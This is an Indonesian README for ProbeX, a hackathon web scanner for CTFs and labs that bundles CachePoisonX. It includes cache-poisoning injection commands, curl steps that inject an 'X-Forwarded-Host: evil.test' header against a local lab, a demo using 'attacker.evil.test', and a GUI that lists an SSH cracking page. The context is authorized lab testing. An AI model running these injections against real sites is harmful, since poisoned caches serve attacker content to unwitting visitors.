# ProbeX — Web Exploitation Scanner + CachePoisonX (CTF / Authorized Labs)

ProbeX adalah scanner deteksi dan eksploitasi web untuk CTF / lab resmi, bagian dari proyek hackathon Codepolitan. Versi ini sudah terintegrasi dengan **CachePoisonX** (dari `demo.zip`): deteksi dan injeksi cache poisoning lewat header unkeyed.

> ⚠️ **Hanya untuk lab milik sendiri atau target dengan izin eksplisit.** Scan tidak berjalan tanpa konsensi pengguna (`PROBEX_CONSENT=1` atau ketik `ya` saat prompt).

---

## Daftar Isi

1. [ProbeX — Vulnerability Scanner](#probex---vulnerability-scanner)
2. [CachePoisonX — Deteksi & Injeksi Cache Poisoning](#cachepoisonx---deteksi--injeksi-cache-poisoning)
3. [Cara Menjalankan Lab (tes_lab)](#cara-menjalankan-lab-tes_lab)
4. [GUI + API Backend (probing lewat browser)](#gui--api-backend-probing-lewat-browser)
5. [CHANGELOG](#changelog)

---

## ProbeX — Vulnerability Scanner

Scanner deteksi kerentanan web untuk developer pemula. Stack: Python, tanpa dependensi berat. Semua deteksi bersifat **non-destruktif** (hanya deteksi dan pelaporan, tidak ada exploit, tidak ada perubahan data pada target).

### Detektor (8 kategori, arsitektur plugin)

| # | Kategori | Tingkat | File detektor |
|---|----------|---------|---------------|
| 1 | Broken Access Control / IDOR | Tinggi | `probex/modules/vuln_idor.py` |
| 2 | Injection: SQL, command, template | Tinggi | `probex/modules/vuln_injection.py` |
| 3 | SSRF | Tinggi | `probex/modules/vuln_ssrf.py` |
| 4 | Authentication / session flaw | Tinggi | `probex/modules/vuln_auth_session.py` |
| 5 | XSS | Sedang | `probex/modules/vuln_xss.py` |
| 6 | Security misconfiguration | Sedang | `probex/modules/vuln_misconfig.py` |
| 7 | Sensitive data exposure | Sedang | `probex/modules/vuln_data_exposure.py` |
| 8 | Business logic flaw | Bervariasi | `probex/modules/vuln_business_logic.py` |

Setiap detektor berdiri sendiri (subclass `BaseModule`) dan mudah ditambah: buat file baru di `probex/modules/`, daftarkan di `probex/core/scanner.py`.

### Format temuan (wajib JSON)

```json
{
  "id": "vuln-001",
  "type": "idor|injection|ssrf|auth_session|xss|misconfig|data_exposure|business_logic",
  "severity": "Tinggi|Sedang|Bervariasi",
  "confidence": "Tinggi|Sedang|Rendah",
  "title": "...",
  "description": "...",
  "location": {
    "url": "...",
    "method": "GET|POST",
    "parameter": "...",
    "parameter_in": "query|body|header|cookie",
    "file": "...",
    "line": 0,
    "snippet": "..."
  },
  "evidence": "...",
  "recommendation": "... (bahasa Indonesia)",
  "references": ["OWASP Top 10 2021 ...", "CWE-..."]
}
```

Lokasi selalu disertakan: URL + parameter untuk mode scan web, atau file + nomor baris untuk mode scan kode statis. Nilai rahasia disamarkan sebelum disimpan ke log/laporan.

### Mode scan

- **Mode URL (dinamis):** `python3 probex.py <URL> --vuln-scan`
  Crawling terbatas (halaman, form, parameter, header, cookie) dalam satu origin, rate limit default 5 req/detik, timeout, User-Agent jelas. Hanya domain target diikuti.
- **Mode kode (statis):** deteksi pola berbahaya dalam source code; lokasi = file + baris.

### Konsensi dan etika (wajib)

Sebelum scan dimulai, pengguna harus menyetujui pernyataan izin uji target (`PROBEX_CONSENT=1` untuk non-TTY/CI). Scan tidak berjalan tanpa konsensi. Tidak ada akses ke alamat internal/metadata cloud (SSRF hanya diuji dengan callback URL milik pengguna). Tidak ada penyimpanan kredensial/rahasia mentah ke log.

### Contoh pemakaian

```bash
# Target latihan lokal (legal, mesin sendiri)
python3 probex.py http://127.0.0.1:8765 --vuln-scan --max-requests 200 --delay 0 --threads 1 --no-banner

# Dengan callback SSRF milik pengguna
python3 probex.py <target> --vuln-scan --ssrf-callback https://callback-contoh.example/cb

# Mode teks polos (non-TTY / redirect log)
python3 probex.py <target> --vuln-scan --no-banner
```

Laporan tersimpan di `reports/` sebagai JSON dan Markdown (nama berkas berstempel waktu). Dashboard Flask: `probex/ui/app.py` (ringkasan per tingkat risiko, tabel temuan filter/urutkan, halaman detail lokasi).

### Bukti berjalan (target latihan lokal)

Target: mini Flask rentan sengaja di `127.0.0.1:8765` (`/page`, `/item?id=`, `/search?q=`, `/fetch?url=`, `/.env`, `/.git/HEAD`, `/login`, `/checkout`).

Hasil scan akhir:
- 12 endpoint ditemukan oleh crawling terbatas
- 17 temuan: idor 2, injection 3, ssrf 1, auth_session 1, xss 4, misconfig 3, data_exposure 1, business_logic 2
- Semua temuan dalam format JSON di atas dengan lokasi (URL + parameter)
- Contoh: `idor` pada `/item?id=1001` (param `id`, query); `injection` SQL pada `/search?q=laptop` (param `q`); `auth_session` pada `/login` (body, tanpa pembatasan percobaan login)

### Pengujian otomatis

```bash
python3 -m pytest tests/      # 36/36 lolos (8 berkas, satu per detektor)
python3 -m py_compile probex/modules/*.py   # semua kompile
```

### Keterbatasan dan asumsi

- IDOR dengan satu sesi hanya berlabel "potensial" (perlu dua akun untuk konfirmasi).
- SSRF tidak pernah diuji aktif ke alamat internal/metadata; hanya identificatory parameter berisiko, kecuali callback publik dikonfigurasi pengguna.
- Command injection hanya dideteksi secara statis (tidak ada eksekusi perintah pada target).
- Business logic tidak dapat diotomasi sepenuhnya: selalu berconfidence rendah, ditandai "perlu verifikasi manual" dengan checklist.
- Crawling terbatas pada satu origin dan depth 1 (maks. 20 halaman).
- Asumsi aman: saat ambigu, pilih opsi paling tidak merusak dan dicatat di laporan.

### Fitur lain di CLI

Flag lama (`--module`, `--ssti`, `--find-flag`, `--guided`, `--flow`, dll.) masih tersedia untuk alur CTF; dokumentasi versi lama tersisa di riwayat repo. Fitur utama versi ini adalah Vulnerability Scanner di atas.

---

## CachePoisonX — Deteksi & Injeksi Cache Poisoning

CachePoisonX (dari `demo.zip`) sudah digabung ke dalam ProbeX. Ada **dua mode yang dipisah**:

| Mode | Perintah | Sifat |
|------|----------|-------|
| **Deteksi** | `python3 probex.py <target> --module cache-poisoning --no-safe` | Read-only, tidak menanam payload |
| **Injeksi** | `python3 probex.py <target> --cache-inject --no-safe` | Benar-benar tanam payload ke cache (attack mode) |

### Deteksi (scan read-only)

```bash
cd /home/liiannn/Downloads/ProbeX
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899 --module cache-poisoning --no-safe --no-banner
```

- Fingerprint layer cache di URL terpisah (tidak mencemari URL target)
- Cache key differential matrix per header
- Probe header unkeyed + verifikasi replay (harus cache HIT)
- Tidak mengubah state cache target

### Injeksi (attack mode)

```bash
cd /home/liiannn/Downloads/ProbeX
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899/article/demo --cache-inject --no-safe --no-banner
```

Butuh `--no-safe`. Tanpa passive bawaan agar budget tidak habis sebelum injeksi selesai.

Flag tambahan:
- `--payload` — profil (`host|webhook|script|redirect|path`), path file, atau literal. Boleh diulang.
- `--header` — header vektor. Boleh diulang. Default: `X-Forwarded-Host`.

Contoh payload file:
```bash
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899/article/demo \
  --cache-inject --no-safe --no-banner --payload /path/to/file.txt --header X-Forwarded-Host
```

Contoh payload custom satu baris ke webhook lab:
```bash
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899/article/demo \
  --cache-inject --no-safe --no-banner --payload "127.0.0.1:8899/_hook/proof" --header X-Forwarded-Host
```

### Alur injeksi (3 langkah)

1. **Clear cache** lab (`/_cache/clear`) — mencegah bug `CACHE_WARM`
2. **INJECT** — kirim request dengan `<header>: <payload>` ke URL target
3. **REPLAY** — request tanpa header (pura-pura korban), verifikasi `X-Cache: HIT` + payload masih ada di body

Verdikt: `INJECTED`, `NOT_STICKY`, `PERSISTS_NO_CACHE`, `IGNORED`, `CACHE_WARM`.

Simulasi korban: 3 replay tanpa header, dilaporkan berapa yang teracuni.

### Buktinya (3 bukti, bukan klaim)

```
step 0  PROBE   (URL terpisah)  X-Cache: MISS    Content-Length: 495
step 1  INJECT  (kirim header)  X-Cache: MISS    Content-Length: 573  <- payload masuk
step 2  REPLAY  (tanpa header)  X-Cache: HIT     Content-Length: 573  <- payload masih ada
```

1. **Jejak cache** — `MISS -> MISS -> HIT`. Request ketiga gak bawa header apa pun, tapi dapet versi yang udah diubah. Artinya cache yang nyajiin, bukan origin.
2. **Content-Length berubah** — 495 jadi 573. Body yang disajiin ke korban memang beda dari body asli.
3. **Callback webhook** — kalau payload nunjuk ke webhook, tiap korban yang buka halaman bakal ninggalin request ke server penyerang. Ini bukti eksekusi, bukan cuma "payload ada di HTML".

### Catatan penting buat demo

- **DVWA polos gak punya cache.** Cache poisoning butuh cache buat diracunin. Demo yang jujur: aplikasi rentan + reverse proxy ber-cache di depannya. `lab_cache_origin.py` sudah mensimulasikan ini.
- Payload `webhook.site` gak bakal dapet callback kalau mesin lab gak ada internet. Buat bukti callback nyata, arahkan ke endpoint lab sendiri: `--payload "127.0.0.1:8899/_hook/proof"`, lalu buka halaman target di browser.
- Tool ini **belum** nangkep poisoning lewat path/parameter unkeyed (`;.css`, `?utm=`). Itu kandidat pengembangan berikutnya.
- Tidak ada temuan **bukan** berarti target aman.
- Payload untuk **header** harus **satu baris** (HTTP header tidak boleh newline). Payload file multiline (mis. PHP) akan ditolak oleh `requests`.

### Bukti di `curl -I` — ini yang paling ditunggu

Setelah injeksi berhasil, `curl -I` menampilkan `X-Cache: HIT` walaupun request tidak mengirim header apa pun.

```
1) sebelum inject   ->  Content-Length: 495   X-Cache: MISS
2) inject pakai GET ->  Content-Length: 531   X-Cache: MISS   (ini yang disimpan)
3) curl -I korban   ->  Content-Length: 531   X-Cache: HIT    <- terbukti
```

### Skrip demo bash (tes_lab/demo.sh)

```bash
cd /home/liiannn/Downloads/ProbeX/tes_lab
./demo.sh                        # payload default
./demo.sh "attacker.evil.test"   # payload kustom
```

Skrip nampilin 4 langkah + kesimpulan berwarna, dan exit 0 cuma kalau `X-Cache: HIT` dan payload beneran tersaji.

---

## Cara Menjalankan Lab (tes_lab)

Lab server ada di `tes_lab/lab_cache_origin.py` (origin + cache + webhook receiver).

### 1. Nyalakan lab (terminal 1)

```bash
cd /home/liiannn/Downloads/ProbeX/tes_lab
python3 lab_cache_origin.py 8899
```

Kalau muncul `OSError: [Errno 98] Address already in use`, matikan dulu:
```bash
pkill -f "lab_cache_origin.py 8899"
```

### 2. Reset lab sebelum demo

```bash
curl -s http://127.0.0.1:8899/_cache/clear
curl -s http://127.0.0.1:8899/_events/clear
```

### 3. Jalankan injeksi dari ProbeX (terminal 2)

```bash
cd /home/liiannn/Downloads/ProbeX
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899/article/demo --cache-inject --no-safe --no-banner
```

### 4. Buka monitor webhook di browser

```
http://127.0.0.1:8899/_monitor
```

Dashboard live (auto-refresh 1,5 detik). Tiap kali ada korban yang membuka halaman teracuni, barisnya nambah sendiri tanpa reload.

Endpoint lab:
- `GET /article/<slug>` — halaman artikel (di-cache)
- `GET /_hook/<token>` — webhook receiver (1x1 png + catat hit)
- `GET /_monitor` — dashboard live
- `GET /_events` — JSON semua hit webhook
- `GET /_events/clear` — kosongkan log
- `GET /_cache/clear` — kosongkan cache

### 5. Bukti manual via curl

```bash
# (a) kondisi bersih
curl -s http://127.0.0.1:8899/_cache/clear

# (b) intip dulu -> MISS
curl -sI http://127.0.0.1:8899/article/demo | grep -iE 'x-cache|content-length'

# (c) INJECT pakai GET (jangan pakai -I!)
curl -s -H 'X-Forwarded-Host: evil.test' -o /dev/null \
  http://127.0.0.1:8899/article/demo

# (d) request korban TANPA header -> HIT
curl -sI http://127.0.0.1:8899/article/demo | grep -iE 'x-cache|content-length'

# (e) bukti payload beneran tersaji
curl -s http://127.0.0.1:8899/article/demo | grep -o 'evil.test'
```

**Kenapa (c) harus GET, bukan `curl -I`:** `HEAD` secara HTTP tidak menyimpan body. Cache yang benar tidak akan menyimpan apa pun dari request HEAD, jadi payload tidak pernah masuk.

## GUI + API Backend (probing lewat browser)

Jika Anda tidak nyaman menggunakan CLI, tersedia **GUI berbasis browser** (`index.html`, `style.css`, `script.js`) yang terhubung ke **backend API** (`probex_api.py`). Keduanya berbasis fungsi yang sama dengan CLI — tidak ada fitur yang terlewat.

### Komponen baru

| File | Fungsi |
|------|--------|
| `index.html` | GUI SPA — 6 halaman: Pemindai, Analisis AI, Pengaturan API, Monitor Poisoning, SSH Crack, Injeksi |
| `style.css` | Palet "Precision Instrument Dark" dari desain Stitch |
| `script.js` | Hubungkan GUI ke backend API via `fetch()` — deteksi & injeksi berjalan nyata (bukan simulasi) |
| `probex_api.py` | Backend API (Python stdlib `http.server`) — endpoint `/api/detect`, `/api/inject`, `/api/events`, `/api/cache/clear`, `/api/status` |

### Cara pakai GUI (tanpa harus buka terminal/CLI)

```bash
# Terminal 1 — nyalakan lab
cd /home/liiannn/Documents/ProbeX/tes_lab
python3 lab_cache_origin.py 8899

# Terminal 2 — nyalakan backend API
cd /home/liiannn/Documents/ProbeX
python3 probex_api.py 8777

# Terminal 3 — buka GUI di browser
xdg-open /home/liiannn/Documents/ProbeX/index.html
```

Di GUI:
- **Pemindai** — masukkan `http://127.0.0.1:8899/article/demo` → klik **Mulai Pindai** (deteksi read-only via `/api/detect`)
- **Injeksi** — masukkan target → klik **Jalankan Pengujian** (injeksi cache poisoning via `/api/inject`, butuh backend aktif)
- **Monitor Poisoning** — pantau webhook events secara real-time via `/api/events` (ambil dari `lab_cache_origin.py` di port 8899)

CLI tetap bisa dipakai langsung seperti sebelumnya:

```bash
# Deteksi (read-only)
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899 --module cache-poisoning --no-safe --no-banner

# Injeksi (attack mode)
PROBEX_CONSENT=1 python3 probex.py http://127.0.0.1:8899/article/demo --cache-inject --no-safe --no-banner
```

Keduanya (GUI dan CLI) menghasilkan hasil yang sama karena memanggil modul CachePoisonX yang sama.

---

## CHANGELOG

Lihat `CHANGELOG.md` di root repository untuk riwayat versi lengkap (v1.6 s/d v1.8, termasuk perbaikan bug dan fitur baru seperti modul `apache_poisoning`, `ip_scan`, panel risiko berbobot severity, dll.).

---

## Struktur Repository

```
/home/liiannn/Documents/ProbeX/
├── README.md                    <- file ini (gabungan semua dokumentasi)
├── CHANGELOG.md                 <- riwayat versi
├── probex.py                    <- CLI utama ProbeX
├── probex_api.py                <- Backend API untuk GUI (port 8777)
├── index.html                   -> GUI SPA (buka di browser)
├── style.css                    -> Palet Precision Instrument Dark
├── script.js                    -> Logika SPA + fetch ke probex_api.py
├── probex/
│   ├── core/
│   │   ├── scanner.py           <- daftar modul (termasuk CachePoisonX)
│   │   ├── config.py            <- konfigurasi global (termasuk cache_inject_*)
│   │   ├── request_manager.py   <- manajer request dengan budget/delay
│   │   └── reporter.py          <- generator laporan
│   └── modules/
│       ├── cachepoisonx/        <- paket CachePoisonX (poisoning, injector, report)
│       ├── cachepoisonx_detector.py   <- wrapper deteksi read-only
│       ├── cachepoisonx_injector.py   <- wrapper injeksi attack mode
│       └── ... (modul scanner lain)
├── tes_lab/
│   ├── lab_cache_origin.py      <- server lab origin + cache + webhook (port 8899)
│   ├── demo.sh                  <- script demo cache poisoning via curl
│   ├── CARA-JALANIN.md          <- panduan cara jalanin (asli dari demo.zip)
│   └── PENJELASAN.md            <- penjelasan integrasi CachePoisonX ke ProbeX
├── reports/                     <- laporan scan (JSON/Markdown)
├── requirements.txt
└── tests/
```

---

**Dibuat untuk hackathon Codepolitan.** Gunakan bijak, hanya pada target yang Anda punya izin untuk menguji.
